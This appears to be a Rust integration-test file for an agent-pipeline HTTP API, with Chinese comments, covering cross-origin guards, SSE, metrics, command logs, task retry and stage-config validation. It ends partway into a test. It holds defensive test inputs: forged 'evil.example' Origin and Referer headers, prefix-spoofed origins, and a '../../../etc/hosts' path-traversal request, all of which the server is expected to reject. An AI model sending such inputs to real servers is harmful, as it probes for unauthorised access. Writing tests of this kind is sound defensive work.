async fn cross_origin_guard_matrix() {
    let api = api().await;
    seed(&api, "t1").await;

    // ① 带自定义头 → 过
    let (status, _) = call(
        &api,
        request("POST", "/tasks/t1/retry")
            .header("X-AgentPipeline", "1")
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from("{}"))
            .unwrap(),
    )
    .await;
    assert_ne!(status, StatusCode::FORBIDDEN, "带自定义头应放行");

    // ② 无 Origin/Referer（非浏览器客户端）→ 过
    let (status, _) = post(&api, "/tasks/t1/retry", serde_json::json!({})).await;
    assert_ne!(status, StatusCode::FORBIDDEN);

    // ③ 本机 Origin → 过
    let (status, _) = call(
        &api,
        request("POST", "/tasks/t1/retry")
            .header(header::ORIGIN, format!("http://127.0.0.1:{PORT}"))
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from("{}"))
            .unwrap(),
    )
    .await;
    assert_ne!(status, StatusCode::FORBIDDEN);

    // ④ 恶意 Origin → 403
    let (status, body) = call(
        &api,
        request("POST", "/tasks/t1/retry")
            .header(header::ORIGIN, "http://evil.example")
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from("{}"))
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");
    assert!(body["error"].as_str().unwrap().contains("跨源"));

    // ⑤ 恶意 Referer 同样被拦（form 提交没有 Origin）
    let (status, _) = call(
        &api,
        request("POST", "/tasks/t1/cancel")
            .header(header::REFERER, "https://evil.example/page")
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::FORBIDDEN);

    // ⑥ GET / SSE 不受影响
    let (status, _) = call(
        &api,
        request("GET", "/tasks/t1/flow")
            .header(header::ORIGIN, "http://evil.example")
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_eq!(
        status,
        StatusCode::OK,
        "SSE / GET 不受跨源防护影响（决策 128）"
    );
}

/// 决策 157：配置 / CLI 扩权的 origin 放行，且只放行**精确匹配**的那一个——
/// 未配置的局域网 origin 与前缀伪装仍被拦。
async fn post_retry_with_origin(api: &Api, origin: &str) -> (StatusCode, Value) {
    call(
        api,
        request("POST", "/tasks/t1/retry")
            .header(header::ORIGIN, origin)
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from("{}"))
            .unwrap(),
    )
    .await
}

#[tokio::test]
async fn cross_origin_allows_configured_extra_origin_only() {
    let api = api_with_origins(
        Settings {
            pending_resume_cooldown_sec: 5,
            ..Default::default()
        },
        vec!["http://192.168.1.50:8787".into()],
    )
    .await;
    seed(&api, "t1").await;

    // ① 配置过的局域网 origin → 过
    let (status, _) = post_retry_with_origin(&api, "http://192.168.1.50:8787").await;
    assert_ne!(status, StatusCode::FORBIDDEN, "扩权 origin 应放行");

    // ② 缺省本机 origin 仍放行
    let (status, _) = post_retry_with_origin(&api, "http://localhost:8787").await;
    assert_ne!(status, StatusCode::FORBIDDEN);

    // ③ 未配置的局域网 origin → 403
    let (status, body) = post_retry_with_origin(&api, "http://192.168.1.51:8787").await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");

    // ④ 扩权 origin 的前缀伪装仍拦
    let (status, body) = post_retry_with_origin(&api, "http://192.168.1.50:8787.evil.com").await;
    assert_eq!(status, StatusCode::FORBIDDEN, "{body}");
}

// ─────────────────────────── SSE 通道（决策 76 / 84 / 123）───────────────────────────

#[tokio::test]
async fn stream_is_the_only_event_channel_and_carries_branch() {
    let api = api().await;
    seed(&api, "t1").await;

    let response = api
        .router
        .clone()
        .oneshot(
            request("GET", "/tasks/t1/stream")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let content_type = response
        .headers()
        .get(header::CONTENT_TYPE)
        .and_then(|v| v.to_str().ok())
        .unwrap_or_default()
        .to_string();
    assert!(
        content_type.starts_with("text/event-stream"),
        "{content_type}"
    );

    // 事件体格式：type + branch（用录制器直接验证序列化契约）
    let recorder = testkit::SseRecorder::new();
    use agentpipeline_core::sse::SseSink;
    recorder.emit(SseEvent::NodeStarted {
        task_id: "t1".into(),
        branch: "develop-design".into(),
        stage: Stage::DevelopDesign,
        node: agentpipeline_core::types::Node::Execute,
        attempt: 1,
        run_id: 1,
    });
    assert_eq!(recorder.count_of(SseEventType::NodeStarted), 1);
    assert_eq!(recorder.branches(), vec!["develop-design".to_string()]);
}

// ─────────────────────────── 只读视图（决策 63 / 99 / 114 / 76）───────────────────────────

#[tokio::test]
async fn flow_metrics_and_conversations_endpoints() {
    let api = api().await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();

    // system run 有 run 行但无会话行（决策 99 / 114）
    let store = &api.state.store;
    let system_run = store
        .insert_run(&agentpipeline_core::storage::observability::NewRun {
            task_id: "t1".into(),
            cursor_id: cursor.cursor_id.clone(),
            stage: Stage::Init,
            node: agentpipeline_core::types::Node::Execute,
            attempt: 1,
            agent_type: "system".into(),
            parent_run_id: None,
            prompt_template_hash: None,
            process_group_id: None,
        })
        .await
        .unwrap();
    store
        .finish_run(
            system_run,
            &agentpipeline_core::storage::observability::RunOutcome {
                status: Some(agentpipeline_core::types::NodeStatus::Success),
                duration_ms: 42,
                ..Default::default()
            },
        )
        .await
        .unwrap();

    let llm_run = store
        .insert_run(&agentpipeline_core::storage::observability::NewRun {
            task_id: "t1".into(),
            cursor_id: cursor.cursor_id.clone(),
            stage: Stage::ArchitectDesign,
            node: agentpipeline_core::types::Node::Execute,
            attempt: 1,
            agent_type: "main".into(),
            parent_run_id: None,
            prompt_template_hash: Some("abcdef0123456789".into()),
            process_group_id: None,
        })
        .await
        .unwrap();
    store
        .finish_run(
            llm_run,
            &agentpipeline_core::storage::observability::RunOutcome {
                status: Some(agentpipeline_core::types::NodeStatus::Success),
                prompt_tokens: 100,
                completion_tokens: 50,
                duration_ms: 7,
                ..Default::default()
            },
        )
        .await
        .unwrap();
    store
        .insert_conversation(
            "t1",
            llm_run,
            Stage::ArchitectDesign,
            agentpipeline_core::types::Node::Execute,
            1,
            "main",
            None,
            &serde_json::json!([{"role": "system", "content": "x"}]),
            Some(&serde_json::json!({"readiness": true})),
            100,
            50,
        )
        .await
        .unwrap();
    store.refresh_task_totals("t1").await.unwrap();

    // metrics：system run 不计入 total_calls（决策 130 ②）
    let (status, body) = get(&api, "/tasks/t1/metrics").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["total_calls"], 1);
    assert_eq!(body["total_tokens"], 150);
    assert_eq!(body["stored_total_calls"], 1);

    // conversations：只列 LLM run
    let (_, body) = get(&api, "/tasks/t1/conversations").await;
    let conversations = body["conversations"].as_array().unwrap();
    assert_eq!(conversations.len(), 1);
    assert_eq!(conversations[0]["agent_type"], "main");

    // 单条会话
    let (status, body) = get(&api, &format!("/tasks/t1/conversations/{llm_run}")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["conversation"]["prompt_tokens"], 100);

    // flow：流转时间线 + 游标
    let (status, body) = get(&api, "/tasks/t1/flow").await;
    assert_eq!(status, StatusCode::OK);
    assert!(body["cursors"].as_array().unwrap().len() == 1);

    // 两条 validate_output run：attempt 1 通过 + attempt 2 通过 → 首过率 0.5
    for attempt in [1u32, 2u32] {
        let id = store
            .insert_run(&agentpipeline_core::storage::observability::NewRun {
                task_id: "t1".into(),
                cursor_id: cursor.cursor_id.clone(),
                stage: Stage::ArchitectDesign,
                node: agentpipeline_core::types::Node::ValidateOutput,
                attempt,
                agent_type: "main".into(),
                parent_run_id: None,
                prompt_template_hash: None,
                process_group_id: None,
            })
            .await
            .unwrap();
        store
            .finish_run(
                id,
                &agentpipeline_core::storage::observability::RunOutcome {
                    status: Some(agentpipeline_core::types::NodeStatus::Success),
                    duration_ms: 3,
                    ..Default::default()
                },
            )
            .await
            .unwrap();
    }

    // 全局指标
    let (status, body) = get(&api, "/metrics").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["tasks"], 1);
    // 全局 token / 调用数 / 首过率复用 metrics 纯函数口径（决策 130② / 137），
    // 与任务级指标同源：3 条 LLM run（1 伪 + 2 validate）、system run 不计。
    assert_eq!(body["total_tokens"], 150, "{body}");
    assert_eq!(body["total_calls"], 3, "{body}");
    assert_eq!(body["validate_first_pass_rate"], 0.5, "{body}");
}

#[tokio::test]
async fn command_log_endpoints_expose_卸载_output() {
    let api = api().await;
    seed(&api, "t1").await;
    let store = &api.state.store;

    use agentpipeline_core::agent::tools::{CommandFinish, CommandRecorder, CommandStart};
    let command_id = store
        .record_start(CommandStart {
            task_id: "t1".into(),
            run_id: None,
            stage: Stage::Test,
            node: agentpipeline_core::types::Node::Execute,
            source: agentpipeline_core::types::CommandSource::System,
            command: "cargo test".into(),
            cwd: "/tmp".into(),
        })
        .await
        .unwrap();
    // 卸载文件真实落盘
    let offload = api._home.home().context_dir("t1").join("out.txt");
    std::fs::create_dir_all(offload.parent().unwrap()).unwrap();
    std::fs::write(&offload, "完整输出\n第二行").unwrap();
    store
        .record_finish(
            command_id,
            CommandFinish {
                exit_code: Some(0),
                stdout_path: Some(offload.display().to_string()),
                duration_ms: 12,
                ..Default::default()
            },
        )
        .await
        .unwrap();

    let (status, body) = get(&api, "/tasks/t1/commands").await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["commands"].as_array().unwrap().len(), 1);
    assert_eq!(body["commands"][0]["command"], "cargo test");

    let (status, body) = get(&api, &format!("/tasks/t1/commands/{command_id}")).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(body["command"]["source"], "system");

    // 完整 stdout 从卸载文件读取（决策 114）
    let response = api
        .router
        .clone()
        .oneshot(
            request("GET", &format!("/tasks/t1/commands/{command_id}/output"))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let bytes = axum::body::to_bytes(response.into_body(), 1024 * 1024)
        .await
        .unwrap();
    assert_eq!(String::from_utf8_lossy(&bytes), "完整输出\n第二行");
}

// ─────────────────────────── 任务产出文件（G12 / §4.2）───────────────────────────

#[tokio::test]
async fn task_files_endpoint_reads_inside_task_dir_only() {
    let api = api().await;
    seed(&api, "t1").await;
    let design = api._home.home().task_file("t1", "design.md");
    std::fs::create_dir_all(design.parent().unwrap()).unwrap();
    std::fs::write(&design, "# 设计文档").unwrap();

    let response = api
        .router
        .clone()
        .oneshot(
            request("GET", "/tasks/t1/files/design.md")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::OK);
    let bytes = axum::body::to_bytes(response.into_body(), 1024 * 1024)
        .await
        .unwrap();
    assert_eq!(String::from_utf8_lossy(&bytes), "# 设计文档");

    // 目录逃逸必须被拒（G11 的 API 侧防线）
    let (status, _) = get(&api, "/tasks/t1/files/../../../etc/hosts").await;
    assert!(
        status == StatusCode::FORBIDDEN || status == StatusCode::NOT_FOUND,
        "越界路径应被拒绝，实际 {status}"
    );
}

// ─────────────── 偏离修复回归（2026-09-12 文档-实现对齐）───────────────

#[tokio::test]
async fn cross_origin_rejects_prefix_spoofing_but_accepts_same_origin_referer_path() {
    // 决策 128（修订）：严格相等，禁前缀匹配
    let api = api().await;
    seed(&api, "t1").await;

    for spoofed in [
        format!("http://127.0.0.1:{PORT}0.evil.example"),
        format!("http://127.0.0.1:{PORT}.evil.example"),
        "http://localhost:9999".to_string(),
    ] {
        let (status, _) = call(
            &api,
            request("POST", "/tasks/t1/retry")
                .header(header::ORIGIN, spoofed.clone())
                .header(header::CONTENT_TYPE, "application/json")
                .body(Body::from("{}"))
                .unwrap(),
        )
        .await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{spoofed}");
    }

    // 同源 Referer（带路径）放行
    let (status, _) = call(
        &api,
        request("POST", "/tasks/t1/retry")
            .header(header::REFERER, format!("http://127.0.0.1:{PORT}/tasks/t1"))
            .body(Body::empty())
            .unwrap(),
    )
    .await;
    assert_ne!(status, StatusCode::FORBIDDEN, "同源 Referer 应放行");
}

#[tokio::test]
async fn human_review_comments_reach_the_transition_reason() {
    // §12.5：`POST /tasks/{id}/review {approved, comments}`，打回时评论带给 develop
    let api = api().await;
    let project_id = seed(&api, "t1").await;
    seed_task_full(
        &api.state.store,
        "t-human",
        &project_id,
        ReviewMode::Human,
        &[],
    )
    .await
    .unwrap();

    let (status, body) = post(
        &api,
        "/tasks/t-human/review",
        serde_json::json!({"approved": false, "comments": "错误处理缺失，请补齐"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    let transitions = api.state.store.list_transitions("t-human").await.unwrap();
    assert!(transitions.iter().any(|t| t
        .reason
        .as_deref()
        .is_some_and(|r| r.contains("错误处理缺失，请补齐"))));
}

#[tokio::test]
async fn goto_rejects_targets_outside_the_stage_entry_node() {
    // 决策 69：goto 落点 = entry_node(stage)
    let api = api().await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    api.state
        .store
        .set_cursor_pending(
            &cursor.cursor_id,
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::UserDecision,
                Stage::Develop,
                agentpipeline_core::types::Node::Execute,
                "重复风险",
            )
            .with_context(agentpipeline_core::types::PendingContext::with_kind(
                "duplicate_risk",
            )),
        )
        .await
        .unwrap();

    // 非入口节点 → 400
    let (status, body) = post(
        &api,
        "/tasks/t1/resume",
        serde_json::json!({"action": "goto", "target_stage": "develop", "target_node": "validate_input"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body["error"].as_str().unwrap().contains("入口节点"));

    // entry_node(stage) → 放行
    let (status, body) = post(
        &api,
        "/tasks/t1/resume",
        serde_json::json!({"action": "goto", "target_stage": "develop", "target_node": "execute"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
}

#[tokio::test]
async fn dependency_failed_continue_requeues_without_spawning() {
    // 决策 130⑤：continue 交还准入，不直接 spawn executor
    let api = api().await;
    seed(&api, "t1").await;
    let cursor = api.state.store.load_live_cursors("t1").await.unwrap()[0].clone();
    api.state
        .store
        .set_cursor_pending(
            &cursor.cursor_id,
            &agentpipeline_core::types::PendingReason::new(
                agentpipeline_core::types::PendingKind::DependencyFailed,
                Stage::Develop,
                agentpipeline_core::types::Node::Execute,
                "依赖任务 dep 已取消",
            )
            .with_context(agentpipeline_core::types::PendingContext::with_kind(
                "dependency_cancelled",
            )),
        )
        .await
        .unwrap();

    let before = api.resumes.load(Ordering::SeqCst);
    let (status, body) = post(
        &api,
        "/tasks/t1/resume",
        serde_json::json!({"action": "continue"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["spawned"], false, "dependency continue不得 spawn");
    assert_eq!(api.resumes.load(Ordering::SeqCst), before);
    assert_eq!(
        api.state.store.get_task("t1").await.unwrap().status,
        TaskStatus::Queued,
        "置回 queued 交还准入（决策 116）"
    );
}

#[tokio::test]
async fn commands_are_scoped_to_their_task() {
    let api = api().await;
    seed(&api, "t1").await;
    seed(&api, "t2").await;

    let cmd_id = api
        .state
        .store
        .record_start(agentpipeline_core::agent::tools::CommandStart {
            task_id: "t1".into(),
            run_id: None,
            stage: Stage::Develop,
            node: agentpipeline_core::types::Node::Execute,
            source: agentpipeline_core::types::CommandSource::System,
            command: "cargo test".into(),
            cwd: ".".into(),
        })
        .await
        .unwrap();

    let (status, _) = get(&api, &format!("/tasks/t2/commands/{cmd_id}")).await;
    assert_eq!(status, StatusCode::NOT_FOUND, "不得跨任务读命令");
    let (status, _) = get(&api, &format!("/tasks/t2/commands/{cmd_id}/output")).await;
    assert_eq!(status, StatusCode::NOT_FOUND);
    let (status, _) = get(&api, &format!("/tasks/t1/commands/{cmd_id}")).await;
    assert_eq!(status, StatusCode::OK);
}

#[tokio::test]
async fn retry_resets_worktree_and_records_the_system_command() {
    // 决策 125：retry 显式 `git reset --hard {base_ref}` + `git clean -fdx`（记 system 命令）
    let api = api().await;
    seed(&api, "t1").await;

    let worktree = api._home.home().worktree_path("t1");
    agentpipeline_core::git::Git
        .init_worktree(api._repo.path(), "t1", &worktree, "main")
        .await
        .unwrap();
    std::fs::write(worktree.join("half_done.txt"), "半成品").unwrap();
    api.state
        .store
        .set_task_worktree("t1", worktree.to_string_lossy().as_ref(), "kanban/t1")
        .await
        .unwrap();
    api.state
        .store
        .mark_terminal("t1", TaskStatus::Failed)
        .await
        .unwrap();

    let (status, body) = post(&api, "/tasks/t1/retry", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::OK, "{body}");

    assert!(
        !worktree.join("half_done.txt").exists(),
        "clean -fdx 应清掉半成品"
    );
    let cmds = api
        .state
        .store
        .list_commands("t1", None, None)
        .await
        .unwrap();
    assert_eq!(cmds.len(), 1, "{:?}", cmds);
    assert_eq!(
        cmds[0].source,
        agentpipeline_core::types::CommandSource::System
    );
    assert!(cmds[0].command.contains("reset --hard"));
    assert_eq!(cmds[0].exit_code, Some(0));
    assert_eq!(
        api.state.store.get_task("t1").await.unwrap().status,
        TaskStatus::Queued,
        "置回 queued 重新走准入（决策 117）"
    );
}

// ─────────────────── 阶段级 agent 配置（决策 22 / 46 / 66 / 111 / 129）───────────────────

#[tokio::test]
async fn stage_config_round_trips_and_resets_to_default() {
    let api = api().await;

    let (status, body) = put(
        &api,
        "/stage-configs/develop",
        serde_json::json!({
            "provider_id": "p-default",
            "temperature": 0.2,
            "max_tokens": 4096,
            "idle_timeout_sec": 120
        }),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["stage_config"]["stage"], "develop");
    assert_eq!(body["stage_config"]["provider_id"], "p-default");
    assert_eq!(body["stage_config"]["max_tokens"], 4096);

    let (status, body) = get(&api, "/stage-configs").await;
    assert_eq!(status, StatusCode::OK, "{body}");
    let list = body["stage_configs"].as_array().unwrap();
    assert_eq!(list.len(), 1, "{body}");
    assert_eq!(list[0]["stage"], "develop");

    // 整条替换：缺省字段清空
    let (status, _) = put(
        &api,
        "/stage-configs/develop",
        serde_json::json!({"max_tokens": 2048}),
    )
    .await;
    assert_eq!(status, StatusCode::OK);
    let cfg = api
        .state
        .store
        .get_stage_config("develop")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(cfg.provider_id, None, "PUT 是整条替换，未给字段回默认");
    assert_eq!(cfg.max_tokens, Some(2048));

    let (status, _) = delete(&api, "/stage-configs/develop").await;
    assert_eq!(status, StatusCode::OK);
    assert!(api
        .state
        .store
        .get_stage_config("develop")
        .await
        .unwrap()
        .is_none());

    let (status, _) = delete(&api, "/stage-configs/develop").await;
    assert_eq!(status, StatusCode::NOT_FOUND, "重复删除应 404");
}

#[tokio::test]
async fn stage_config_accepts_node_scoped_skills_and_rejects_unknown() {
    // 决策 170：节点级技能经 `node_overrides_json[node].skills` 声明，
    // 准入语义与启动校验同源（未知技能名 → 400）。
    //
    // 票 03：技能正文来自**用户目录技能**（不再依赖内嵌常量），
    // 故先在 API 自己的临时 home 技能根下放两个技能。
    let api = api().await;
    let skills_root = api.state.home.root().join("skills");
    for name in ["grilling", "to-spec"] {
        let dir = skills_root.join(name);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("SKILL.md"),
            format!("---\nname: {name}\ndescription: 测试技能\n---\n\n{name} 的正文"),
        )
        .unwrap();
    }

    // 知识型技能（用户目录有正文）→ 可写入并原样回读
    let payload = serde_json::json!({
        "node_overrides_json": {
            "validate_input": {"skills": ["grilling"]},
            "execute": {"skills": ["to-spec"]}
        }
    });
    let (status, body) = put(&api, "/stage-configs/architect-design", payload.clone()).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(
        body["stage_config"]["node_overrides_json"]["validate_input"]["skills"][0],
        "grilling"
    );

    let cfg = api
        .state
        .store
        .get_stage_config("architect-design")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(
        cfg.node_overrides_json.as_ref(),
        Some(&payload["node_overrides_json"])
    );

    // 未知技能名 → 400，且报错定位到节点
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "node_overrides_json": {"validate_input": {"skills": ["no-such-skill"]}}
        }),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let err = body["error"].as_str().unwrap();
    assert!(err.contains("no-such-skill"), "{body}");
    assert!(err.contains("validate_input"), "报错须定位到节点：{body}");

    // 拒绝后原配置不变（写入校验通过才落库）
    let still = api
        .state
        .store
        .get_stage_config("architect-design")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(
        still.node_overrides_json.as_ref(),
        Some(&payload["node_overrides_json"])
    );
}

/// 决策 172④（票 05）：`PUT /stage-configs` 的准入语义覆盖技能声明的**新形态**。
///
/// 端点复用启动校验本体，故混合数组、未知 mode、未信任 + full 三条都在这里见效——
/// 这是「写入校验与启动语义同源、不漂移」的直接检验。
#[tokio::test]
async fn stage_config_validates_skill_declaration_shapes() {
    let api = api().await;
    let skills_root = api.state.home.root().join("skills");
    let dir = skills_root.join("mixed");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("SKILL.md"),
        "---\nname: mixed\ndescription: 测试技能\n---\n\n正文",
    )
    .unwrap();

    // ① 裸字符串（旧格式）→ 向后兼容，可写入
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"node_overrides_json": {"validate_input": {"skills": ["mixed"]}}}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "旧格式必须零迁移：{body}");

    // ② 对象形态 + mode = name + trusted = true → 可写入
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"node_overrides_json": {"validate_input": {"skills": [
            {"name": "mixed", "mode": "name", "trusted": true}
        ]}}}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    // ③ 非法 mode → 400，报错定位到节点
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"node_overrides_json": {"validate_input": {"skills": [
            {"name": "mixed", "mode": "half"}
        ]}}}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let err = body["error"].as_str().unwrap();
    assert!(err.contains("half"), "{body}");
    assert!(err.contains("validate_input"), "报错须定位到节点：{body}");

    // ④ 未信任 + full → 400（选型 D：不得全文注入未信任技能）
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"node_overrides_json": {"validate_input": {"skills": [
            {"name": "mixed", "mode": "full", "trusted": false}
        ]}}}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("信任"),
        "报错须点明信任：{body}"
    );
}

/// 决策 172③（票 07）：兄弟文件缺失时 `PUT /stage-configs` 即拒绝。
///
/// 技能包残缺必须在写入时暴露，而不是等 agent 开工才拿到少一节的正文。
#[tokio::test]
async fn stage_config_rejects_skill_with_missing_sibling() {
    let api = api().await;
    let dir = api.state.home.root().join("skills").join("broken");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("SKILL.md"), "主文档\n\n[gone.md](gone.md)\n").unwrap();

    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"node_overrides_json": {"validate_input": {"skills": ["broken"]}}}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let err = body["error"].as_str().unwrap();
    assert!(err.contains("broken"), "须含技能名：{body}");
    assert!(err.contains("gone.md"), "须含缺失文件名：{body}");
}

#[tokio::test]
async fn stage_config_rejects_empty_knowledge_skill_body() {
    // 决策 170：知识型技能正文为空的用户文件 → 拒绝（与 persona_path 同口径）
    let api = api().await;
    let skill_dir = api.state.home.root().join("skills").join("blank-skill");
    std::fs::create_dir_all(&skill_dir).unwrap();
    std::fs::write(skill_dir.join("SKILL.md"), "  \n").unwrap();

    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "node_overrides_json": {"validate_input": {"skills": ["blank-skill"]}}
        }),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("正文为空"),
        "{body}"
    );
}

#[tokio::test]
async fn stage_config_accepts_pseudo_stage_keys_but_rejects_unknown() {
    let api = api().await;

    let (status, body) = put(
        &api,
        "/stage-configs/project_analysis",
        serde_json::json!({"provider_id": "p-default"}),
    )
    .await;
    assert_eq!(
        status,
        StatusCode::OK,
        "伪阶段键应可配置（决策 67/87）：{body}"
    );

    let (status, body) = put(&api, "/stage-configs/nope", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("未知阶段"),
        "{body}"
    );
}

#[tokio::test]
async fn stage_config_rejects_unusable_provider_and_persona() {
    let api = api().await;

    let (status, body) = put(
        &api,
        "/stage-configs/review",
        serde_json::json!({"provider_id": "missing-provider"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("provider"),
        "{body}"
    );

    let (status, body) = put(
        &api,
        "/stage-configs/review",
        serde_json::json!({"persona_path": "personas/no-such-file.md"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("persona_path"),
        "{body}"
    );

    // 校验失败不得落库
    assert!(api
        .state
        .store
        .get_stage_config("review")
        .await
        .unwrap()
        .is_none());
}

#[tokio::test]
async fn stage_config_delete_refused_when_cross_family_judge_requires_it() {
    // 与启动同源的校验（决策 134⑤）：删掉被开关依赖的伪阶段配置 → 拒绝
    let api = api_with(Settings {
        pending_resume_cooldown_sec: 5,
        cross_family_judge: true,
        ..Default::default()
    })
    .await;

    // 开关开启却没有配置 → 写入其他阶段也应被拒（整体校验）
    let (status, body) = put(
        &api,
        "/stage-configs/develop",
        serde_json::json!({"provider_id": "p-default"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");

    let (status, body) = put(
        &api,
        "/stage-configs/validator_cross_check",
        serde_json::json!({"provider_id": "p-default"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    let (status, body) = delete(&api, "/stage-configs/validator_cross_check").await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        api.state
            .store
            .get_stage_config("validator_cross_check")
            .await
            .unwrap()
            .is_some(),
        "被拒绝的删除不得落库"
    );
}

// ─────────────────── project_analysis 伪阶段接入 analyze（决策 48 / 130⑦ / 78）───────────────────

#[tokio::test]
async fn analyze_merges_project_analysis_llm_summary_into_result() {
    use agentpipeline_core::pipeline::pseudo::ProjectAnalysisResult;
    use agentpipeline_core::pipeline::Executor;
    use testkit::{FakeAgent, RecordingKiller, Script};

    let api = api().await;
    let project_id = seed(&api, "t-analyze").await;

    let mut script = Script::new();
    script
        .for_pseudo("pseudo:project_analysis")
        .submit(&ProjectAnalysisResult {
            summary: "Rust 单仓服务，用 cargo 测试".into(),
            suspicious: vec!["没有 CI 配置".into()],
        });

    // 注入带脚本化 LLM 的执行器（生产实现是 ProductionLlm，替换边界只到 LLM 响应流）
    let executor = Arc::new(Executor::new(
        api.state.store.clone(),
        api.state.settings.clone(),
        api.state.sse.clone(),
        Arc::new(FakeAgent::new(script)),
        Arc::new(RecordingKiller::new()),
    ));
    let mut state = api.state.clone();
    state.executor = Some(executor);
    let router = build_router(state);

    let (status, body) = json_body(
        router
            .clone()
            .oneshot(
                request("POST", "/projects/analyze")
                    .header(header::CONTENT_TYPE, "application/json")
                    .body(Body::from(
                        serde_json::json!({ "project_id": project_id }).to_string(),
                    ))
                    .unwrap(),
            )
            .await
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::ACCEPTED, "{body}");

    // 异步分析：轮询到终态
    let mut analysis = Value::Null;
    for _ in 0..200 {
        let (_, body) = json_body(
            router
                .clone()
                .oneshot(
                    request("GET", &format!("/projects/{project_id}/analysis"))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap(),
        )
        .await;
        if body["status"] == "done" || body["status"] == "failed" {
            analysis = body;
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(20)).await;
    }

    assert_eq!(analysis["status"], "done", "{analysis}");
    assert_eq!(
        analysis["result"]["summary"],
        "Rust 单仓服务，用 cargo 测试"
    );
    assert_eq!(analysis["result"]["suspicious"][0], "没有 CI 配置");
    assert!(
        analysis["result"]["language"].is_string(),
        "确定性探测事实必须保留：{analysis}"
    );

    // 票 10 / 决策 100：项目级伪阶段落独立 run + 会话行（无任务、project_id 归属）
    let runs = api
        .state
        .store
        .list_project_runs(&project_id)
        .await
        .unwrap();
    assert_eq!(runs.len(), 1, "应落一行项目级伪阶段 run");
    assert_eq!(runs[0].agent_type, "pseudo:project_analysis");
    assert!(runs[0].task_id.is_none() && runs[0].cursor_id.is_none());
    assert_eq!(
        runs[0].status,
        agentpipeline_core::types::NodeStatus::Success
    );
    let conversation = api
        .state
        .store
        .get_project_conversation(&project_id, runs[0].id)
        .await
        .unwrap()
        .expect("应落一行项目级伪阶段会话");
    assert_eq!(conversation.agent_type, "pseudo:project_analysis");

    // 决策 130 ②：项目级伪阶段计入全局 total_calls（非 system）
    let all = api.state.store.all_runs().await.unwrap();
    assert_eq!(agentpipeline_core::metrics::total_calls(&all), 1);
}

#[tokio::test]
async fn analyze_keeps_facts_and_records_summary_error_when_llm_unavailable() {
    // 验收：LLM 不可用时的既有降级不回退——保留确定事实 + 记 summary_error，
    // 且 run 行按决策 100 收尾为 failed（不落会话），整个分析仍 done。
    use agentpipeline_core::agent::client::{AgentResponse, LlmClient, LlmRequest};
